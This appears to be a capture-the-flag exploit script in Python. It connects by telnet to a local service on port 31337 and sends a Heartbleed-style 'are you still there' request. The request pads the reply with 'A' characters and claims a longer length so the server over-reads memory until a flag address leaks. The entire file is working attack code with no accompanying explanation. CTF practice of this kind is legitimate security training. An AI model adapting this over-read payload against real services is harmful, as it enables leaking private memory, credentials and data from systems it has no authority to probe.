import sys
import telnetlib

HOST = 'localhost'
PORT = 31337

def exploit():

    addr_flag = 0x6b7540
    input_addr = 0x6b7340
    diff = addr_flag - input_addr

    for i in range(1, 40):
        tn = telnetlib.Telnet(HOST, PORT)
        payload  = b'SERVER, ARE YOU STILL THERE? IF SO, REPLY "'
        payload += b'A'*diff
        payload += b'" ('
        payload += str(i+diff).encode()
        payload += b' LETTERS'
        payload += b'\n'
        tn.write(payload)
        data = tn.read_until(b'\n')
        
        del(tn)

        if b'NICE' in data:
            break
        else:
            print(data.decode())
        
        
    
def main():


    exploit()
            
if __name__ == '__main__':
    main()
    
